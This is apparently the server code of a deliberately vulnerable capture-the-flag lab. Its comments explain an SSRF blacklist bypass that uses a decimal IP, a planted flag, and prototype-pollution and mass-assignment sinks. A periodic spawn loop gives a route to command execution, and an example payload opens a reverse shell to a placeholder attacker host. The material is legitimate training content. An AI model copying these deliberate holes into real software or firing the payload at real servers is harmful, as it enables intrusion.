'use strict';

const express = require('express');
const session = require('express-session');
const cors    = require('cors');
const os      = require('os');

const previewRouter  = require('./routes/preview');
const authRouter     = require('./routes/auth');
const internalRouter = require('./routes/internal');
const reportRouter   = require('./routes/report');
const config         = require('./config');

// ─── Main API Application ─────────────────────────────────────────────────────

const app = express();

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: false }));
app.use(cors({ origin: true, credentials: true }));

app.use(session({
  secret:            process.env.SESSION_SECRET || 'f4llb4ck_s3cr3t_do_not_use',
  resave:            false,
  saveUninitialized: true,
  cookie:            { secure: false, httpOnly: true, maxAge: 86_400_000 }
}));

// Auto-initialise a guest session on every new visitor
app.use((req, _res, next) => {
  if (!req.session.user) {
    req.session.user = {
      username:  'guest',
      role:      'guest',
      is_admin:  false,
      clearance: 0
    };
  }
  next();
});

app.use('/api/v1/preview',  previewRouter);
app.use('/api/v1/auth',     authRouter);
app.use('/api/v1/internal', internalRouter);
app.use('/api/v1/report',   reportRouter);

app.get('/health', (_req, res) => res.json({ status: 'ok' }));

app.listen(8080, '0.0.0.0', () =>
  console.log('[*] CipherOps backend API listening on :8080')
);

// ─── Internal Debug Server (loopback-only) ────────────────────────────────────
//
// VULNERABILITY: This server exposes sensitive route information and Flag 1.
// It is bound ONLY to 127.0.0.1 (loopback), so it is NOT accessible externally.
//
// However, the /api/v1/preview endpoint makes server-side HTTP requests on
// behalf of the user (SSRF). The blacklist rejects "127.0.0.1" and "localhost"
// as literal strings but does NOT normalise IP representations first.
//
// BYPASS: Send the URL with the decimal encoding of 127.0.0.1:
//   http://2130706433:6666/
//
// Node.js / axios uses the WHATWG URL parser which normalises 2130706433 → 127.0.0.1
// AFTER the blacklist check runs on the raw string, so the request succeeds.
// ─────────────────────────────────────────────────────────────────────────────

const debugApp = express();
debugApp.use(express.json());

debugApp.get('/', (_req, res) => {
  res.json({
    service:        'CipherOps Internal Debug API',
    host:           os.hostname(),
    uptime_seconds: Math.floor(process.uptime()),
    // ── FLAG 1 ────────────────────────────────────────────────────────────────
    flag:           'VulnOs{ssrf_bypassed_bl4ckl1st_w1th_d3c1m4l_1p}',
    // ─────────────────────────────────────────────────────────────────────────
    warning:        'This service is INTERNAL ONLY and must not be reachable externally.',
    routes: {
      public: [
        'POST /api/v1/preview         – LinkedIn URL preview (SSRF sink)',
        'POST /api/v1/auth/login      – Consultant authentication',
        'POST /api/v1/auth/logout',
        'GET  /api/v1/auth/session'
      ],
      internal: [
        'GET  /api/v1/internal/debug  – view session + system logs',
        'PUT  /api/v1/internal/debug  – update session properties  [MASS ASSIGNMENT SINK]'
      ],
      admin: [
        'POST /api/v1/report/generate – generate report  [PROTOTYPE POLLUTION SINK]',
        'GET  /api/v1/report/status'
      ]
    }
  });
});

debugApp.listen(6666, '127.0.0.1', () =>
  console.log('[*] Internal debug server on 127.0.0.1:6666 (loopback only)')
);

// ─── Scheduled Cleanup (RCE Trigger) ─────────────────────────────────────────
//
// VULNERABILITY: reads shell / shellArgs / env from the shared `config` object.
// If Object.prototype has been polluted via merge-deep in /routes/report.js,
// these lookups resolve to the attacker-controlled values through the prototype
// chain, causing arbitrary command execution every 30 seconds.
//
// Example: after sending --
//   { "options": { "__proto__": { "shell": "bash",
//       "shellArgs": ["-c", "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"] } } }
// -- config.shell → "bash", config.shellArgs → ["-c", "bash -i ..."]
// ─────────────────────────────────────────────────────────────────────────────

const { spawn } = require('child_process');

setInterval(() => {
  const shell     = config.shell     || 'sh';
  const shellArgs = config.shellArgs || ['-c', 'echo "[cron] cleanup ok"'];
  const envExtra  = config.env       || {};

  const proc = spawn(shell, shellArgs, {
    env:      { ...process.env, ...envExtra },
    detached: true,
    stdio:    'ignore'
  });
  proc.unref();
}, 30_000);
